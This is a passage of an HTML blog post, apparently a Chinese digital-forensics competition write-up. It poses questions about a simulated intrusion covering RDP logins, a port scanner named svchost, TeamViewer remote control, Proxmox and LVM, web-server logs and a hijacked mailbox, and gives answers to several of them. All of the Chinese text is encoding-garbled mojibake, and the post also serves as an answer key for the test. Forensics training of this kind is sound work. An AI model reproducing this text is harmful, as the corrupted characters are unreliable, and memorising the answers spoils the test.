href="#10-é»‘å®¢ç¬¬ä¸€æ¬¡é‡‡ç”¨ç”¨æˆ·-â€˜adminâ€™-é€šè¿‡è¿œç¨‹æ¡Œé¢åè®®-Remote-Desktop-Protocol-RDP-ç™»å½•äº†AGC-CSè®¡ç®—æœºçš„æ—¶é—´æ˜¯-ä»¥æ—¶åŒºUTC-8å›ç­”-å¦‚ç­”æ¡ˆä¸º-2022-12-29-16-01-59ï¼Œéœ€å›ç­”-20221229160159-2-å¡«ç©º" class="headerlink" title="10    é»‘å®¢ç¬¬ä¸€æ¬¡é‡‡ç”¨ç”¨æˆ· â€˜adminâ€™ é€šè¿‡è¿œç¨‹æ¡Œé¢åè®® (Remote Desktop Protocol - RDP) ç™»å½•äº†AGC-CSè®¡ç®—æœºçš„æ—¶é—´æ˜¯? (ä»¥æ—¶åŒºUTC+8å›ç­”) (å¦‚ç­”æ¡ˆä¸º 2022-12-29 16:01:59ï¼Œéœ€å›ç­” 20221229160159)    2    å¡«ç©º"></a>10    é»‘å®¢ç¬¬ä¸€æ¬¡é‡‡ç”¨ç”¨æˆ· â€˜adminâ€™ é€šè¿‡è¿œç¨‹æ¡Œé¢åè®® (Remote Desktop Protocol - RDP) ç™»å½•äº†AGC-CSè®¡ç®—æœºçš„æ—¶é—´æ˜¯? (ä»¥æ—¶åŒºUTC+8å›ç­”) (å¦‚ç­”æ¡ˆä¸º 2022-12-29 16:01:59ï¼Œéœ€å›ç­” 20221229160159)    2    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-151156225.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ipéƒ½ä¸€æ ·å¯ä»¥çŸ¥é“éƒ½æ˜¯ä¸€ä¸ªäººè¿çš„é‚£ä¹ˆè¿™ä¸ªäººåªèƒ½æ˜¯é»‘å®¢<br>20220929204102</p><h1 id="11-é»‘å®¢å…¥ä¾µAGC-CSè®¡ç®—æœºåä¸‹è½½äº†ä¸€ä¸ªæ‰«æç«¯å£-Port-Scanning-çš„è½¯ä»¶ï¼Œè¿™è½¯ä»¶çš„çœŸæ­£åç§°æ˜¯-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#11-é»‘å®¢å…¥ä¾µAGC-CSè®¡ç®—æœºåä¸‹è½½äº†ä¸€ä¸ªæ‰«æç«¯å£-Port-Scanning-çš„è½¯ä»¶ï¼Œè¿™è½¯ä»¶çš„çœŸæ­£åç§°æ˜¯-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="11    é»‘å®¢å…¥ä¾µAGC-CSè®¡ç®—æœºåä¸‹è½½äº†ä¸€ä¸ªæ‰«æç«¯å£ (Port Scanning) çš„è½¯ä»¶ï¼Œè¿™è½¯ä»¶çš„çœŸæ­£åç§°æ˜¯? (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>11    é»‘å®¢å…¥ä¾µAGC-CSè®¡ç®—æœºåä¸‹è½½äº†ä¸€ä¸ªæ‰«æç«¯å£ (Port Scanning) çš„è½¯ä»¶ï¼Œè¿™è½¯ä»¶çš„çœŸæ­£åç§°æ˜¯? (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><p>å¯ä»¥å†downloadçœ‹åˆ°svchost<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-152529418.png" class=""><br>è¿è¡Œvcshostå¯ä»¥å‘ç°å™¨æ˜¯ç«¯å£æ‰«æå™¨</p><h1 id="12-æ‰¿ä¸Šé¢˜ï¼Œé»‘å®¢é‡‡ç”¨ä¸Šè¿°è½¯ä»¶å–å¾—ä¸€äº›è®¡ç®—æœºçš„IPåœ°å€åŠåª’ä½“è®¿é—®æ§åˆ¶åœ°å€-â€˜Media-Access-Controlâ€™-Address-MAC-Address-å¹¶å­˜åˆ°ä¸€ä¸ªåä¸º-â€˜ip-txtâ€™-çš„æ¡£æ¡ˆã€‚-å½“ä¸­-â€˜192-168-182-130â€™-è®¡ç®—æœºçš„MACåœ°å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜ï¼šâ€™-æˆ–-â€˜-â€˜-ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#12-æ‰¿ä¸Šé¢˜ï¼Œé»‘å®¢é‡‡ç”¨ä¸Šè¿°è½¯ä»¶å–å¾—ä¸€äº›è®¡ç®—æœºçš„IPåœ°å€åŠåª’ä½“è®¿é—®æ§åˆ¶åœ°å€-â€˜Media-Access-Controlâ€™-Address-MAC-Address-å¹¶å­˜åˆ°ä¸€ä¸ªåä¸º-â€˜ip-txtâ€™-çš„æ¡£æ¡ˆã€‚-å½“ä¸­-â€˜192-168-182-130â€™-è®¡ç®—æœºçš„MACåœ°å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜ï¼šâ€™-æˆ–-â€˜-â€˜-ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="12    æ‰¿ä¸Šé¢˜ï¼Œé»‘å®¢é‡‡ç”¨ä¸Šè¿°è½¯ä»¶å–å¾—ä¸€äº›è®¡ç®—æœºçš„IPåœ°å€åŠåª’ä½“è®¿é—®æ§åˆ¶åœ°å€ (â€˜Media Access Controlâ€™ Address - MAC Address) å¹¶å­˜åˆ°ä¸€ä¸ªåä¸º â€˜ip.txtâ€™ çš„æ¡£æ¡ˆã€‚ å½“ä¸­ â€˜192.168.182.130â€™ è®¡ç®—æœºçš„MACåœ°å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ â€˜ï¼šâ€™ æˆ– â€˜-â€˜ ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>12    æ‰¿ä¸Šé¢˜ï¼Œé»‘å®¢é‡‡ç”¨ä¸Šè¿°è½¯ä»¶å–å¾—ä¸€äº›è®¡ç®—æœºçš„IPåœ°å€åŠåª’ä½“è®¿é—®æ§åˆ¶åœ°å€ (â€˜Media Access Controlâ€™ Address - MAC Address) å¹¶å­˜åˆ°ä¸€ä¸ªåä¸º â€˜ip.txtâ€™ çš„æ¡£æ¡ˆã€‚ å½“ä¸­ â€˜192.168.182.130â€™ è®¡ç®—æœºçš„MACåœ°å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ â€˜ï¼šâ€™ æˆ– â€˜-â€˜ ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-155737605.png" class="">  <p>æ‰¾ip.txtæ˜¾ç¤ºå†æ¡Œé¢ä½†æ˜¯ä»¿çœŸèµ·æ¥ï¼Œæ¡Œé¢æ‰¾ä¸åˆ°ï¼Œçœ‹ä¸€ä¸‹è¿œæ§è½¯ä»¶ip.txtä¼ å›äº†jinhaoçš„ç”µè„‘</p><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-161036383.png" class="">  <img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-161003081.png" class="">  <p>9061aec09045</p><h1 id="13-AGC-CSè®¡ç®—æœºé‡Œçš„ä¸€ä¸ªè·³è½¬åˆ—è¡¨-Jumplist-æ˜¾ç¤ºäº†ç”¨æˆ·-â€˜adminâ€™-æ›¾ç»é‡‡ç”¨è®°äº‹æœ¬-Notepad-æ‰“å¼€äº†ä¸€ä¸ªæ–‡å­—æ¡£æ¡ˆï¼Œè¿™ä¸ªæ–‡å­—æ¡£çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#13-AGC-CSè®¡ç®—æœºé‡Œçš„ä¸€ä¸ªè·³è½¬åˆ—è¡¨-Jumplist-æ˜¾ç¤ºäº†ç”¨æˆ·-â€˜adminâ€™-æ›¾ç»é‡‡ç”¨è®°äº‹æœ¬-Notepad-æ‰“å¼€äº†ä¸€ä¸ªæ–‡å­—æ¡£æ¡ˆï¼Œè¿™ä¸ªæ–‡å­—æ¡£çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="13    AGC-CSè®¡ç®—æœºé‡Œçš„ä¸€ä¸ªè·³è½¬åˆ—è¡¨ (Jumplist) æ˜¾ç¤ºäº†ç”¨æˆ· â€˜adminâ€™ æ›¾ç»é‡‡ç”¨è®°äº‹æœ¬ (Notepad) æ‰“å¼€äº†ä¸€ä¸ªæ–‡å­—æ¡£æ¡ˆï¼Œè¿™ä¸ªæ–‡å­—æ¡£çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ?  (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>13    AGC-CSè®¡ç®—æœºé‡Œçš„ä¸€ä¸ªè·³è½¬åˆ—è¡¨ (Jumplist) æ˜¾ç¤ºäº†ç”¨æˆ· â€˜adminâ€™ æ›¾ç»é‡‡ç”¨è®°äº‹æœ¬ (Notepad) æ‰“å¼€äº†ä¸€ä¸ªæ–‡å­—æ¡£æ¡ˆï¼Œè¿™ä¸ªæ–‡å­—æ¡£çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ?  (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-161339346.png" class="">  <img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-155143078.png" class="">  <p>320A98F6519748D16B8870EF4D8A606D656C5A09CF2F660AA35EBF6495824CB1</p><h1 id="14-é»‘å®¢é™¤äº†é€šè¿‡-â€˜RDPâ€™-å¤–ï¼Œè¿˜é‡‡ç”¨ä»€ä¹ˆè½¯ä»¶è¿œç«¯æ§åˆ¶-Remote-Control-AGC-CSè®¡ç®—æœº-1"><a href="#14-é»‘å®¢é™¤äº†é€šè¿‡-â€˜RDPâ€™-å¤–ï¼Œè¿˜é‡‡ç”¨ä»€ä¹ˆè½¯ä»¶è¿œç«¯æ§åˆ¶-Remote-Control-AGC-CSè®¡ç®—æœº-1" class="headerlink" title="14    é»‘å®¢é™¤äº†é€šè¿‡ â€˜RDPâ€™ å¤–ï¼Œè¿˜é‡‡ç”¨ä»€ä¹ˆè½¯ä»¶è¿œç«¯æ§åˆ¶ (Remote Control) AGC-CSè®¡ç®—æœº?    1"></a>14    é»‘å®¢é™¤äº†é€šè¿‡ â€˜RDPâ€™ å¤–ï¼Œè¿˜é‡‡ç”¨ä»€ä¹ˆè½¯ä»¶è¿œç«¯æ§åˆ¶ (Remote Control) AGC-CSè®¡ç®—æœº?    1</h1><p>å•é€‰<br>A:VNC;<br>B:Teamviewer;<br>C:Anydesk;<br>D:Splashtop Business Access;<br>E:RemotePC<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-160149628.png" class="">  </p><p>B</p><h1 id="15-AGC-Serveré‡ŒLVM-Logical-Volume-Management-é€»è¾‘å·è½´ç®¡ç†-çš„-VG-Volume-Group-å·ç»„-â€˜pveâ€™-å…±æœ‰å¤šå°‘PE-Physical-Extent-ç‰©ç†å—-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#15-AGC-Serveré‡ŒLVM-Logical-Volume-Management-é€»è¾‘å·è½´ç®¡ç†-çš„-VG-Volume-Group-å·ç»„-â€˜pveâ€™-å…±æœ‰å¤šå°‘PE-Physical-Extent-ç‰©ç†å—-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="15    AGC_Serveré‡ŒLVM (Logical Volume Management é€»è¾‘å·è½´ç®¡ç†) çš„ VG (Volume Group å·ç»„) â€˜pveâ€™ å…±æœ‰å¤šå°‘PE (Physical Extent ç‰©ç†å—) ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>15    AGC_Serveré‡ŒLVM (Logical Volume Management é€»è¾‘å·è½´ç®¡ç†) çš„ VG (Volume Group å·ç»„) â€˜pveâ€™ å…±æœ‰å¤šå°‘PE (Physical Extent ç‰©ç†å—) ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="16-AGC-Serveré‡ŒLVM-çš„-LV-é‚è¼¯å·-â€pve-dataâ€-ä½¿ç”¨äº†å¤šå°‘ç™¾åˆ†æ¯”çš„ç©ºé–“-ä¸ç”¨å¡«å¯«-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#16-AGC-Serveré‡ŒLVM-çš„-LV-é‚è¼¯å·-â€pve-dataâ€-ä½¿ç”¨äº†å¤šå°‘ç™¾åˆ†æ¯”çš„ç©ºé–“-ä¸ç”¨å¡«å¯«-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="16    AGC_Serveré‡ŒLVM çš„ LV(é‚è¼¯å·)â€pve-dataâ€ ä½¿ç”¨äº†å¤šå°‘ç™¾åˆ†æ¯”çš„ç©ºé–“? (ä¸ç”¨å¡«å¯« â€˜%â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>16    AGC_Serveré‡ŒLVM çš„ LV(é‚è¼¯å·)â€pve-dataâ€ ä½¿ç”¨äº†å¤šå°‘ç™¾åˆ†æ¯”çš„ç©ºé–“? (ä¸ç”¨å¡«å¯« â€˜%â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><h1 id="17-AGC-Serveré‡Œçš„-â€˜Proxmoxâ€™-è™šæ‹ŸåŒ–ç¯å¢ƒ-Virtual-Environment-VE-æœ‰å“ªä¸€ä¸ªç”¨æˆ·-2"><a href="#17-AGC-Serveré‡Œçš„-â€˜Proxmoxâ€™-è™šæ‹ŸåŒ–ç¯å¢ƒ-Virtual-Environment-VE-æœ‰å“ªä¸€ä¸ªç”¨æˆ·-2" class="headerlink" title="17    AGC_Serveré‡Œçš„ â€˜Proxmoxâ€™ è™šæ‹ŸåŒ–ç¯å¢ƒ (Virtual Environment - VE) æœ‰å“ªä¸€ä¸ªç”¨æˆ·?    2"></a>17    AGC_Serveré‡Œçš„ â€˜Proxmoxâ€™ è™šæ‹ŸåŒ–ç¯å¢ƒ (Virtual Environment - VE) æœ‰å“ªä¸€ä¸ªç”¨æˆ·?    2</h1><p>å¤šé€‰    A:root;<br>B:VM_admin;<br>C:sysadmin;<br>D:acl;<br>E:tss    </p><h1 id="18-åˆ†æ-â€˜VMâ€™-è™šæ‹Ÿæœº-ç¼–å·-â€˜111â€™-AGCç½‘ç«™çš„ç½‘é¡µæœåŠ¡å™¨æ—¥å¿—ï¼Œå½“ä¸­è®°å½•äº†é»‘å®¢æ›¾å‘è¯¥æœåŠ¡å™¨å‘å‡ºå¤šå°‘æ¬¡èˆ‡è¿œç¨‹ä»£ç åŸ·è¡Œ-Remote-Code-Execution-çš„ç½‘ç»œæ”»å‡»ï¼Ÿ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º"><a href="#18-åˆ†æ-â€˜VMâ€™-è™šæ‹Ÿæœº-ç¼–å·-â€˜111â€™-AGCç½‘ç«™çš„ç½‘é¡µæœåŠ¡å™¨æ—¥å¿—ï¼Œå½“ä¸­è®°å½•äº†é»‘å®¢æ›¾å‘è¯¥æœåŠ¡å™¨å‘å‡ºå¤šå°‘æ¬¡èˆ‡è¿œç¨‹ä»£ç åŸ·è¡Œ-Remote-Code-Execution-çš„ç½‘ç»œæ”»å‡»ï¼Ÿ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º" class="headerlink" title="18    åˆ†æ â€˜VMâ€™ (è™šæ‹Ÿæœº) ç¼–å· â€˜111â€™ AGCç½‘ç«™çš„ç½‘é¡µæœåŠ¡å™¨æ—¥å¿—ï¼Œå½“ä¸­è®°å½•äº†é»‘å®¢æ›¾å‘è¯¥æœåŠ¡å™¨å‘å‡ºå¤šå°‘æ¬¡èˆ‡è¿œç¨‹ä»£ç åŸ·è¡Œ (Remote Code Execution) çš„ç½‘ç»œæ”»å‡»ï¼Ÿ (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º"></a>18    åˆ†æ â€˜VMâ€™ (è™šæ‹Ÿæœº) ç¼–å· â€˜111â€™ AGCç½‘ç«™çš„ç½‘é¡µæœåŠ¡å™¨æ—¥å¿—ï¼Œå½“ä¸­è®°å½•äº†é»‘å®¢æ›¾å‘è¯¥æœåŠ¡å™¨å‘å‡ºå¤šå°‘æ¬¡èˆ‡è¿œç¨‹ä»£ç åŸ·è¡Œ (Remote Code Execution) çš„ç½‘ç»œæ”»å‡»ï¼Ÿ (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º</h1><h1 id="19-å“ªä¸€ä¸ªIPåœ°å€å°è¯•ç™»å½•â€™VMâ€™-è™šæ‹Ÿæœº-ç¼–å·-â€˜111â€™-å¤±è´¥æ¬¡æ•°æœ€å¤š-1"><a href="#19-å“ªä¸€ä¸ªIPåœ°å€å°è¯•ç™»å½•â€™VMâ€™-è™šæ‹Ÿæœº-ç¼–å·-â€˜111â€™-å¤±è´¥æ¬¡æ•°æœ€å¤š-1" class="headerlink" title="19    å“ªä¸€ä¸ªIPåœ°å€å°è¯•ç™»å½•â€™VMâ€™ (è™šæ‹Ÿæœº) ç¼–å· â€˜111â€™ å¤±è´¥æ¬¡æ•°æœ€å¤š?    1"></a>19    å“ªä¸€ä¸ªIPåœ°å€å°è¯•ç™»å½•â€™VMâ€™ (è™šæ‹Ÿæœº) ç¼–å· â€˜111â€™ å¤±è´¥æ¬¡æ•°æœ€å¤š?    1</h1><p>å•é€‰<br>A:38.242.130.207;<br>B:218.92.0.206;<br>C:43.142.93.22;<br>D:121.202.141.105;<br>E:61.238.217.108    </p><h1 id="20-é»‘å®¢åœ¨å…¥ä¾µ-â€˜VMâ€™-ç¼–å·-â€˜111â€™-åï¼Œæ‰“ç®—æ¶‚æ”¹AGCå…¬å¸çš„ç½‘é¡µï¼Œé»‘å®¢åœ¨ä¼ é€ç›¸å…³æ¡£æ¡ˆæ—¶æ‰€ç”¨çš„ç«¯å£-Port-æ˜¯ä»€ä¹ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#20-é»‘å®¢åœ¨å…¥ä¾µ-â€˜VMâ€™-ç¼–å·-â€˜111â€™-åï¼Œæ‰“ç®—æ¶‚æ”¹AGCå…¬å¸çš„ç½‘é¡µï¼Œé»‘å®¢åœ¨ä¼ é€ç›¸å…³æ¡£æ¡ˆæ—¶æ‰€ç”¨çš„ç«¯å£-Port-æ˜¯ä»€ä¹ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="20    é»‘å®¢åœ¨å…¥ä¾µ â€˜VMâ€™ ç¼–å· â€˜111â€™ åï¼Œæ‰“ç®—æ¶‚æ”¹AGCå…¬å¸çš„ç½‘é¡µï¼Œé»‘å®¢åœ¨ä¼ é€ç›¸å…³æ¡£æ¡ˆæ—¶æ‰€ç”¨çš„ç«¯å£ (Port) æ˜¯ä»€ä¹ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>20    é»‘å®¢åœ¨å…¥ä¾µ â€˜VMâ€™ ç¼–å· â€˜111â€™ åï¼Œæ‰“ç®—æ¶‚æ”¹AGCå…¬å¸çš„ç½‘é¡µï¼Œé»‘å®¢åœ¨ä¼ é€ç›¸å…³æ¡£æ¡ˆæ—¶æ‰€ç”¨çš„ç«¯å£ (Port) æ˜¯ä»€ä¹ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><h1 id="21-æ ¹æ®-â€˜VMâ€™-ç¼–å·-â€˜111â€™-é‡Œçš„ç½‘é¡µæœåŠ¡å™¨-Web-Server-çš„è®¾å®šï¼Œè®¿å®¢å¯ä»ä¸‹åˆ—å“ªä¸ªç½‘é¡µåœ°å€è®¿é—®è¿™ä¸ªæœåŠ¡å™¨-2"><a href="#21-æ ¹æ®-â€˜VMâ€™-ç¼–å·-â€˜111â€™-é‡Œçš„ç½‘é¡µæœåŠ¡å™¨-Web-Server-çš„è®¾å®šï¼Œè®¿å®¢å¯ä»ä¸‹åˆ—å“ªä¸ªç½‘é¡µåœ°å€è®¿é—®è¿™ä¸ªæœåŠ¡å™¨-2" class="headerlink" title="21    æ ¹æ® â€˜VMâ€™ ç¼–å· â€˜111â€™ é‡Œçš„ç½‘é¡µæœåŠ¡å™¨ (Web Server) çš„è®¾å®šï¼Œè®¿å®¢å¯ä»ä¸‹åˆ—å“ªä¸ªç½‘é¡µåœ°å€è®¿é—®è¿™ä¸ªæœåŠ¡å™¨?    2"></a>21    æ ¹æ® â€˜VMâ€™ ç¼–å· â€˜111â€™ é‡Œçš„ç½‘é¡µæœåŠ¡å™¨ (Web Server) çš„è®¾å®šï¼Œè®¿å®¢å¯ä»ä¸‹åˆ—å“ªä¸ªç½‘é¡µåœ°å€è®¿é—®è¿™ä¸ªæœåŠ¡å™¨?    2</h1><p>å¤šé€‰    A:localhost;<br>B:www.ag.com.shop;<br>C:www.agcom.shop;<br>D:agcom.shop;<br>E:www.agcom.com    </p><h1 id="22-é»‘å®¢æ›¾å…¥ä¾µ-â€˜VMâ€™-ç¼–å·-â€˜111â€™-é‡Œçš„ç”µé‚®ç³»ç»Ÿ-â€˜Xeamsâ€™ï¼Œä»–ç™»å½•çš„æ—¶é—´æ˜¯-ä»¥unixæ—¶é—´æˆ³å›ç­”ï¼Œæ ¼å¼å¦‚-1665049779010-2-å¡«ç©º"><a href="#22-é»‘å®¢æ›¾å…¥ä¾µ-â€˜VMâ€™-ç¼–å·-â€˜111â€™-é‡Œçš„ç”µé‚®ç³»ç»Ÿ-â€˜Xeamsâ€™ï¼Œä»–ç™»å½•çš„æ—¶é—´æ˜¯-ä»¥unixæ—¶é—´æˆ³å›ç­”ï¼Œæ ¼å¼å¦‚-1665049779010-2-å¡«ç©º" class="headerlink" title="22    é»‘å®¢æ›¾å…¥ä¾µ â€˜VMâ€™ ç¼–å· â€˜111â€™ é‡Œçš„ç”µé‚®ç³»ç»Ÿ â€˜Xeamsâ€™ï¼Œä»–ç™»å½•çš„æ—¶é—´æ˜¯? (ä»¥unixæ—¶é—´æˆ³å›ç­”ï¼Œæ ¼å¼å¦‚:1665049779010)    2    å¡«ç©º"></a>22    é»‘å®¢æ›¾å…¥ä¾µ â€˜VMâ€™ ç¼–å· â€˜111â€™ é‡Œçš„ç”µé‚®ç³»ç»Ÿ â€˜Xeamsâ€™ï¼Œä»–ç™»å½•çš„æ—¶é—´æ˜¯? (ä»¥unixæ—¶é—´æˆ³å›ç­”ï¼Œæ ¼å¼å¦‚:1665049779010)    2    å¡«ç©º</h1><h1 id="23-é»‘å®¢åœ¨å…¥ä¾µåç›—ç”¨AGCå‘˜å·¥ç”µé‚®æˆ·å£åŠå†’å……AGCå‘˜å·¥å›å¤äº†ç”µé‚®ç»™å®¢æˆ·ï¼Œå‘å‡ºè¿™å°ç”µé‚®çš„æ“ä½œç³»ç»Ÿ-Operating-System-åŠç”µé‚®è½¯ä»¶-Mail-Agent-æ˜¯ä»€ä¹ˆ-2"><a href="#23-é»‘å®¢åœ¨å…¥ä¾µåç›—ç”¨AGCå‘˜å·¥ç”µé‚®æˆ·å£åŠå†’å……AGCå‘˜å·¥å›å¤äº†ç”µé‚®ç»™å®¢æˆ·ï¼Œå‘å‡ºè¿™å°ç”µé‚®çš„æ“ä½œç³»ç»Ÿ-Operating-System-åŠç”µé‚®è½¯ä»¶-Mail-Agent-æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="23    é»‘å®¢åœ¨å…¥ä¾µåç›—ç”¨AGCå‘˜å·¥ç”µé‚®æˆ·å£åŠå†’å……AGCå‘˜å·¥å›å¤äº†ç”µé‚®ç»™å®¢æˆ·ï¼Œå‘å‡ºè¿™å°ç”µé‚®çš„æ“ä½œç³»ç»Ÿ (Operating System) åŠç”µé‚®è½¯ä»¶ (Mail Agent) æ˜¯ä»€ä¹ˆ?    2"></a>23    é»‘å®¢åœ¨å…¥ä¾µåç›—ç”¨AGCå‘˜å·¥ç”µé‚®æˆ·å£åŠå†’å……AGCå‘˜å·¥å›å¤äº†ç”µé‚®ç»™å®¢æˆ·ï¼Œå‘å‡ºè¿™å°ç”µé‚®çš„æ“ä½œç³»ç»Ÿ (Operating System) åŠç”µé‚®è½¯ä»¶ (Mail Agent) æ˜¯ä»€ä¹ˆ?    2</h1><p>å•é€‰<br>A:Mac OS X 10.15 rv:102.0 Thunderbird/102.3.0;<br>B:Mac OS X 10.15 rv:102.0 Thunderbird/91.13.1;<br>C:Mac OS X 10.11 rv:91.0 Thunderbird/91.13.1;<br>D:Mac OS X 10.11 rv:60.0 Thunderbird/60.9.1;<br>E:Windows 10 Pro Outlook 2016    </p><h1 id="24-é»‘å®¢åœ¨-â€˜Proxmoxâ€™-é‡Œç•™ä¸‹äº†ä¸€ä¸ªè¢«åŠ å¯†äº†çš„ç¨‹åº-Program-ï¼Œåœ¨è§£å¯†åå®ƒçš„SHA-256å“ˆå¸Œå€¼-Hash-Value-æ˜¯ä»€ä¹ˆ-2"><a href="#24-é»‘å®¢åœ¨-â€˜Proxmoxâ€™-é‡Œç•™ä¸‹äº†ä¸€ä¸ªè¢«åŠ å¯†äº†çš„ç¨‹åº-Program-ï¼Œåœ¨è§£å¯†åå®ƒçš„SHA-256å“ˆå¸Œå€¼-Hash-Value-æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="24    é»‘å®¢åœ¨ â€˜Proxmoxâ€™ é‡Œç•™ä¸‹äº†ä¸€ä¸ªè¢«åŠ å¯†äº†çš„ç¨‹åº (Program)ï¼Œåœ¨è§£å¯†åå®ƒçš„SHA-256å“ˆå¸Œå€¼ (Hash Value) æ˜¯ä»€ä¹ˆ?    2"></a>24    é»‘å®¢åœ¨ â€˜Proxmoxâ€™ é‡Œç•™ä¸‹äº†ä¸€ä¸ªè¢«åŠ å¯†äº†çš„ç¨‹åº (Program)ï¼Œåœ¨è§£å¯†åå®ƒçš„SHA-256å“ˆå¸Œå€¼ (Hash Value) æ˜¯ä»€ä¹ˆ?    2</h1><p>å•é€‰<br>A:C89D7Aâ€¦ â€¦8C4E76;<br>B:C7141Fâ€¦ â€¦64BF65;<br>C:E9433Eâ€¦ â€¦1A5134;<br>D:45CE1Câ€¦ â€¦79BD4A;<br>E:0ACAA5â€¦ â€¦AB7ECE    </p><h1 id="25-æ‰¿ä¸Šé¢˜ï¼Œåˆ†æç¨‹åºä»£ç -Program-Code-ï¼Œä¸Šè¿°ç¨‹åºçš„æ¡£æ¡ˆååº”è¯¥æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚-Cat10-jpgï¼Œéœ€å›ç­”CAT10JPG-3-å¡«ç©º"><a href="#25-æ‰¿ä¸Šé¢˜ï¼Œåˆ†æç¨‹åºä»£ç -Program-Code-ï¼Œä¸Šè¿°ç¨‹åºçš„æ¡£æ¡ˆååº”è¯¥æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚-Cat10-jpgï¼Œéœ€å›ç­”CAT10JPG-3-å¡«ç©º" class="headerlink" title="25    æ‰¿ä¸Šé¢˜ï¼Œåˆ†æç¨‹åºä»£ç  (Program Code)ï¼Œä¸Šè¿°ç¨‹åºçš„æ¡£æ¡ˆååº”è¯¥æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚ Cat10.jpgï¼Œéœ€å›ç­”CAT10JPG)    3    å¡«ç©º"></a>25    æ‰¿ä¸Šé¢˜ï¼Œåˆ†æç¨‹åºä»£ç  (Program Code)ï¼Œä¸Šè¿°ç¨‹åºçš„æ¡£æ¡ˆååº”è¯¥æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ 